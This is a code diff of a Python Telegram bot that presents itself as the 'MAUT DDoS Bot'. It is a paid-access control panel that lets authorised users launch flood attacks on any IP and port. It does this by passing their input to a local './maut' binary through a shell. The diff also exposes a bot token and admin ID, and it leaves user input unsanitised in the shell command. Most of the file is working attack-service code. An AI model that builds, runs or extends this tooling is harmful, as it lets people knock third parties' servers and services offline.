@@ -10,7 +10,7 @@ import re
 bot = telebot.TeleBot('7970310406:AAGh47IMJxhCPwqTDe_3z3PCvXugf7Y3yYE')
 admin_id = {"8167507955"}
 USER_FILE = "users.txt"
-USER_TIME_LIMITS = "user_limits.txt"  # New file for storing time limits
+USER_TIME_LIMITS = "user_limits.txt"
 LOG_FILE = "attack_logs.txt"
 COOLDOWN_TIME = 300  # 5 minutes
 MAX_ATTACK_TIME = 180  # 3 minutes
@@ -20,7 +20,7 @@ IMAGE_URL = "https://t.me/gggkkkggggiii/8"
 user_attack_data = {}
 maut_cooldown = {}
 allowed_user_ids = []
-user_time_limits = {}  # {user_id: (limit_seconds, expiry_timestamp)}
+user_time_limits = {}
 
 def load_users():
     global allowed_user_ids, user_time_limits
@@ -30,7 +30,6 @@ def load_users():
     except FileNotFoundError:
         allowed_user_ids = []
     
-    # Load time limits
     try:
         with open(USER_TIME_LIMITS, "r") as f:
             for line in f:
@@ -43,7 +42,6 @@ def save_users():
     with open(USER_FILE, "w") as f:
         f.write("\n".join(allowed_user_ids))
     
-    # Save time limits
     with open(USER_TIME_LIMITS, "w") as f:
         for user_id, (limit_sec, expiry) in user_time_limits.items():
             f.write(f"{user_id}|{limit_sec}|{expiry}\n")
@@ -58,11 +56,9 @@ def log_attack(user_id, target, port, time):
         print(f"Logging error: {e}")
 
 def parse_time_input(time_str):
-    """Parse time input like 1day, 2hours, 30min into seconds"""
     time_str = time_str.lower()
     total_seconds = 0
     
-    # Find all number-unit pairs
     matches = re.findall(r'(\d+)\s*(day|hour|min|sec|d|h|m|s)', time_str)
     
     for amount, unit in matches:
@@ -78,21 +74,20 @@ def parse_time_input(time_str):
     
     return total_seconds if total_seconds > 0 else None
 
-# Start command with image and instructions
 @bot.message_handler(commands=['start'])
 def start_command(message):
     caption = """
 🚀 *Welcome to MAUT DDoS Bot* 🚀
 
 *Available Commands:*
-/maut - Start a new attack (ip port time)
+/maut <ip> <port> <time> - Start attack
 /mylogs - View your attack history
 /help - Show all commands
 /rules - Usage guidelines
 
 *Admin Commands:*
-/add - Add new user with time limit
-/remove - Remove user
+/add <user_id> <time> - Add user
+/remove <user_id> - Remove user
 /allusers - List all users
 /logs - View all attack logs
 /clearlogs - Clear logs
@@ -111,35 +106,32 @@ def start_command(message):
         bot.reply_to(message, caption, parse_mode="Markdown")
         print(f"Error sending image: {e}")
 
-# Improved attack command that accepts all parameters at once
 @bot.message_handler(commands=['maut'])
 def handle_attack_command(message):
     user_id = str(message.chat.id)
     if user_id not in allowed_user_ids:
         return bot.reply_to(message, "❌ Access denied. Contact admin.")
     
+    # Check cooldown first
     if user_id in maut_cooldown:
         remaining = COOLDOWN_TIME - (datetime.datetime.now() - maut_cooldown[user_id]).seconds
         if remaining > 0:
             return bot.reply_to(message, f"⏳ Cooldown active. Wait {remaining} seconds.")
     
-    # Check if user has time limit
+    # Check time limit if exists
     if user_id in user_time_limits:
         limit_sec, expiry = user_time_limits[user_id]
         if time.time() > expiry:
             del user_time_limits[user_id]
             save_users()
-        else:
-            remaining_time = expiry - time.time()
-            hours = int(remaining_time // 3600)
-            mins = int((remaining_time % 3600) // 60)
-            return bot.reply_to(message, f"⏳ Your access expires in {hours}h {mins}m")
+            allowed_user_ids.remove(user_id)
+            return bot.reply_to(message, "❌ Your access has expired. Contact admin.")
     
-    # Parse command arguments
+    # Parse command
     try:
         args = message.text.split()
         if len(args) != 4:
-            return bot.reply_to(message, "❌ Usage: /maut <ip> <port> <time>")
+            return bot.reply_to(message, "❌ Usage: /maut <ip> <port> <time>\nExample: /maut 1.1.1.1 80 60")
         
         ip = args[1]
         port = args[2]
@@ -147,7 +139,7 @@ def handle_attack_command(message):
         
         # Validate IP
         if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
-            return bot.reply_to(message, "❌ Invalid IP format")
+            return bot.reply_to(message, "❌ Invalid IP format. Example: 1.1.1.1")
         
         # Validate port
         if not port.isdigit() or not 1 <= int(port) <= 65535:
@@ -195,10 +187,12 @@ def handle_buttons(call):
         
         data = user_attack_data[user_id]
         try:
+            # Execute attack
             subprocess.Popen(f"./maut {data['ip']} {data['port']} {data['time']} 900", shell=True)
             log_attack(user_id, data['ip'], data['port'], data['time'])
             maut_cooldown[user_id] = datetime.datetime.now()
             
+            # Update message
             bot.edit_message_text(
                 chat_id=call.message.chat.id,
                 message_id=call.message.message_id,
@@ -210,6 +204,7 @@ def handle_buttons(call):
                 parse_mode="Markdown"
             )
             
+            # Add new attack button
             markup = types.InlineKeyboardMarkup()
             markup.add(types.InlineKeyboardButton("⚡ New Attack", callback_data="new_attack"))
             bot.send_message(call.message.chat.id, "✅ Attack started successfully!", reply_markup=markup)
@@ -238,7 +233,6 @@ def handle_buttons(call):
     
     bot.answer_callback_query(call.id)
 
-# Improved add command with time limit
 @bot.message_handler(commands=['add'])
 def add_user(message):
     user_id = str(message.chat.id)
@@ -256,7 +250,6 @@ def add_user(message):
         if new_user in allowed_user_ids:
             return bot.reply_to(message, "ℹ️ User already exists.")
         
-        # Parse time limit
         limit_seconds = parse_time_input(time_limit)
         if not limit_seconds:
             return bot.reply_to(message, "❌ Invalid time format. Use like: 1day, 2hours30min")
@@ -266,17 +259,15 @@ def add_user(message):
         allowed_user_ids.append(new_user)
         save_users()
         
-        # Convert seconds to readable format
+        # Format time for response
         days = limit_seconds // 86400
         hours = (limit_seconds % 86400) // 3600
         minutes = (limit_seconds % 3600) // 60
-        seconds = limit_seconds % 60
         
         time_str = []
         if days: time_str.append(f"{days} day{'s' if days>1 else ''}")
         if hours: time_str.append(f"{hours} hour{'s' if hours>1 else ''}")
         if minutes: time_str.append(f"{minutes} minute{'s' if minutes>1 else ''}")
-        if seconds: time_str.append(f"{seconds} second{'s' if seconds>1 else ''}")
         
         bot.reply_to(message, f"✅ User {new_user} added with limit: {' '.join(time_str)}")
     except Exception as e:
@@ -354,7 +345,6 @@ def clear_logs(message):
     except:
         bot.reply_to(message, "❌ Error clearing logs.")
 
-# User commands
 @bot.message_handler(commands=['mylogs'])
 def my_logs(message):
     user_id = str(message.chat.id)
@@ -373,7 +363,7 @@ def my_logs(message):
     if not user_logs:
         return bot.reply_to(message, "ℹ️ No attacks found in your history.")
     
-    bot.reply_to(message, f"📜 Your Attack History:\n\n" + "".join(user_logs[-10:]))  # Show last 10 attacks
+    bot.reply_to(message, f"📜 Your Attack History:\n\n" + "".join(user_logs[-10:]))
 
 @bot.message_handler(commands=['help'])
 def help_command(message):
@@ -381,14 +371,14 @@ def help_command(message):
 🛠 *MAUT Bot Help* 🛠
 
 *User Commands:*
-/maut <ip> <port> <time> - Start new attack
-/mylogs - View your attack history
+/maut <ip> <port> <time> - Start attack
+/mylogs - View your history
 /rules - Usage guidelines
 
 *Admin Commands:*
-/add <user_id> <time> - Add new user (e.g. 1day2hours)
+/add <user_id> <time> - Add user
 /remove <user_id> - Remove user
-/allusers - List users with status
+/allusers - List users
 /logs - View all logs
 /clearlogs - Clear logs
 
@@ -403,7 +393,7 @@ def rules_command(message):
 📜 *Usage Rules* 📜
 
 1. Max attack time: 180 seconds
-2. 5 minutes cooldown between attacks
+2. 5 minutes cooldown
 3. No concurrent attacks
 4. No illegal targets
 
